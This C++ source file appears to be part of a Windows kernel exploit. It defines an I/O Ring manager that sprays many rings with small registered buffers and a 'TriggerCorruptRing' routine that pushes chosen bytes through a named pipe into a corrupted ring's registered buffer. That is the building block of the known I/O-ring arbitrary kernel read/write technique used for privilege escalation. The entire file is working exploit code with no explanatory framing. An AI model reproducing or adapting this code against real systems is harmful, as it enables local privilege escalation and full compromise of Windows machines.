#include "ioRingManager.h"

IORingManager::IORingManager()
{
    ioRings = nullptr;
    ioRingCount = 0;
}

HIORING IORingManager::CreateRing()
{
    HIORING hIoRing = NULL;

    IORING_CREATE_FLAGS flags;
    flags.Required = IORING_CREATE_REQUIRED_FLAGS_NONE;
    flags.Advisory = IORING_CREATE_ADVISORY_FLAGS_NONE;
    
    UINT32 submissionQueueSize = 0x100;
    UINT32 completionQueueSize = 0x200;

    HRESULT status = CreateIoRing(IORING_VERSION_4, flags, submissionQueueSize, completionQueueSize, &hIoRing);

    if (!SUCCEEDED(status) || hIoRing == NULL) {
        DEBUG_PRINT(" [!] Failed to create I/O Ring. HRESULT: 0x%X\n", status);
        return NULL;
    }
    // Allocate heap buffer and register it with the kernel.
    BYTE* myBuffer = new BYTE[0x8]();

    IORING_BUFFER_INFO bufferInfo;
    bufferInfo.Address = myBuffer;
    bufferInfo.Length = sizeof(BYTE) * 0x8;

    HRESULT hr = BuildIoRingRegisterBuffers(hIoRing, 1, &bufferInfo, 0);

    if (!SUCCEEDED(hr)) {
        // registration failed: cleanup and return
        DEBUG_PRINT(" [!] Failed to register buffer. HRESULT: 0x%X\n", hr);
        delete[] myBuffer;
        CloseIoRing(hIoRing);
        return NULL;
    }

    // Track buffer for later cleanup.
    registeredBuffers.push_back(myBuffer);

    UINT32 submittedEntries = 0;
    hr = SubmitIoRing(hIoRing, 1, INFINITE, &submittedEntries);

    if (!SUCCEEDED(hr)) {
        // submission failed (logged for debug)
        DEBUG_PRINT(" [!] Failed to submit. Error: 0x%X\n", hr);
    }

    return hIoRing;
}


void IORingManager::CreateRings(UINT64 iCount)
{

    ioRingVector.clear();
    ioRingVector.reserve((size_t)iCount);

    // Create requested rings (NULL entries indicate failures).
    for (UINT64 i = 0; i < iCount; ++i)
    {
        HIORING ring = CreateRing();
        ioRingVector.push_back(ring);
    }

    // expose plain pointer for existing code paths that expect ioRings
    ioRings = ioRingVector.empty() ? nullptr : ioRingVector.data();
    ioRingCount = iCount;
}


void IORingManager::TriggerCorruptRing(UINT64 data, UINT64 payloadSize)
{

    LPCSTR pipeName = "\\\\.\\pipe\\IoRingPayloadPipe";
    HANDLE hReadPipe = CreateNamedPipeA(
        pipeName,
        PIPE_ACCESS_INBOUND | FILE_FLAG_OVERLAPPED,
        PIPE_TYPE_BYTE | PIPE_WAIT,
        1,
        0x1000,
        0x1000,
        0,
        NULL
    );

    // Create read pipe for payload.
    if (hReadPipe == INVALID_HANDLE_VALUE) {
        DEBUG_PRINT(" [!] Failed to create read pipe.\n");
        return;
    }

    HANDLE hWritePipe = CreateFileA(
        pipeName,
        GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    // Open write end of the pipe.
    if (hWritePipe == INVALID_HANDLE_VALUE) {
        DEBUG_PRINT(" [!] Failed to open write pipe.\n");
        CloseHandle(hReadPipe);
        return;
    }

    // Prepare payload and write to pipe.
    std::vector<BYTE> payload((size_t)payloadSize);
    size_t copySize = std::min<size_t>(sizeof(data), (size_t)payloadSize);
    memcpy(payload.data(), &data, copySize);

    DWORD bytesWritten = 0;
    WriteFile(hWritePipe, payload.data(), (DWORD)payloadSize, &bytesWritten, NULL);

    // Build read SQE targeting registered buffer index 0.
    IORING_HANDLE_REF fileRef = IoRingHandleRefFromHandle(hReadPipe);
    IORING_BUFFER_REF bufferRef = IoRingBufferRefFromIndexAndOffset(0, 0);

    HRESULT status = BuildIoRingReadFile(corruptedRing, fileRef, bufferRef, payloadSize, 0, NULL, IOSQE_FLAGS_NONE);



    // Submit SQE(s) to kernel.
    UINT32 submittedEntries = 0;
    status = SubmitIoRing(corruptedRing, 1, INFINITE, &submittedEntries);



    // Pop one completion entry (inspect cqe for result if needed).
    IORING_CQE cqe = { 0 };
    HRESULT popStatus = PopIoRingCompletion(corruptedRing, &cqe);
    // Close pipe handles.
    CloseHandle(hWritePipe);
    CloseHandle(hReadPipe);
}

void IORingManager::ClearRings()
{
    // close any created rings
    for (size_t i = 0; i < ioRingVector.size(); ++i)
    {
        HIORING ring = ioRingVector[i];
        if (ring != NULL)
        {
            CloseIoRing(ring);
        }
    }
    ioRingVector.clear();

    // free registered buffers
    for (BYTE* buf : registeredBuffers)
    {
        delete[] buf;
    }
    registeredBuffers.clear();

    ioRings = nullptr;
    ioRingCount = 0;
}